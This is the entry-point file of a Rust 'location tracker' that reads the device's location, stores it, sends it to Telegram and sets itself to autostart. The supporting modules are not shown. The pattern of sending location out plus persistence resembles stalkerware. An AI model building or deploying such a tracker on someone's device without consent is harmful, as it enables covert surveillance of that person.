use std::error::Error;

mod location;
mod storage;
mod system;
mod telegram;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    println!("Starting location tracker...");

    let location = location::get_location()?;
    println!("Location: {:?}", location);

    storage::save_location(&location)?;

    if let Err(e) = telegram::send_location_to_telegram(&location).await {
        eprintln!("Failed to send to Telegram: {}", e);
    } else {
        println!("Location sent to Telegram successfully!");
    }

    system::ensure_autostart()?;

    println!("Location tracked successfully!");
    Ok(())
}
